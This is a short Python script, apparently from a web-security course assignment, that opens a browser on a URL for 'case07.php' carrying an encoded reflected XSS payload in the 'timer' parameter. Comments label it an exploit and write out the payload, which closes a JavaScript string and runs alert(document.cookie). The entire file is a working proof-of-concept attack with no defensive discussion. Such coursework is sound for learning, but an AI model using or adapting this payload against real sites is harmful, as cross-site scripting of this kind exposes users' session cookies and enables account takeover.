import webbrowser

# Exploit:
# timer = 10';alert(document.cookie);alert('
# Reflected XSS (with XSS-auditor)

def main():
    webbrowser.open('http://www.wsb.com/Assignment2/case07.php?timer=10%27%29%3B+alert%28document.cookie%29%3Balert%28%27', 2)

if __name__ == "__main__":
    main()
